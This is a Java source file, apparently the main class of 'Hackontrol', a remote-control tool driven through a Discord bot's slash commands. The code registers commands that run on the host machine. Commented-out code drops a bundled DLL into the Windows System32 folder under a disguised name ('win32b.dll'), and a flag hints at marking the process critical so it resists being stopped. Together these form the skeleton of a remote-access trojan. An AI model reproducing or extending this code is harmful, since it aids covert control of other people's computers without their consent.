package com.khopan.hackontrol;

import java.lang.annotation.Native;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import com.khopan.hackontrol.command.CommandManager;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.Command;
import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;

public class Hackontrol {
	private static final String LIBRARY_NAME = "win32b.dll";

	@Native
	private static final boolean CRITICAL_PROCESS = false;

	private final JDA bot;
	private final Map<Command, com.khopan.hackontrol.command.Command> map;

	private Hackontrol(JDA bot, String machineIdentifier) {
		this.bot = bot;
		this.map = new LinkedHashMap<>();
		this.bot.addEventListener(new Listener());
		CommandManager.register(this :: register);
		System.err.println("Hello, world!");
	}

	private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
		if(commandClass == null) {
			return;
		}

		com.khopan.hackontrol.command.Command command;

		try {
			command = commandClass.getConstructor().newInstance();
		} catch(Throwable Errors) {
			return;
		}

		SlashCommandData data = command.getCommand();
		Command botCommand;

		try {
			botCommand = this.bot.upsertCommand(data).complete();
		} catch(Throwable Errors) {
			return;
		}

		this.map.put(botCommand, command);
	}

	private void onSlashCommand(SlashCommandInteractionEvent Event) {
		long identifier = Event.getCommandIdLong();
		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();

		while(iterator.hasNext()) {
			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
			Command key = entry.getKey();
			com.khopan.hackontrol.command.Command value = entry.getValue();

			if(key.getIdLong() != identifier) {
				continue;
			}

			new Thread(() -> value.handleCommand(Event)).start();
			return;
		}
	}

	public static void main(String[] args) throws Throwable {
		/*String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File win32Library = new File(system32Directory, "win32c.dll");
		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
		byte[] data = stream.readAllBytes();
		stream.close();

		try {
			FileOutputStream output = new FileOutputStream(libraryFile);
			output.write(data);
			output.close();
		} catch(Throwable Errors) {

		}

		System.load(libraryFile.getAbsolutePath());*/
		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
		/*JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
				.build();

		try {
			bot.awaitReady();
		} catch(Throwable ignored) {
			return;
		}

		String machineIdentifier = Machine.getIdentifier();
		new Hackontrol(bot, machineIdentifier);*/
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onSlashCommandInteraction(SlashCommandInteractionEvent Event) {
			Hackontrol.this.onSlashCommand(Event);
		}
	}
}
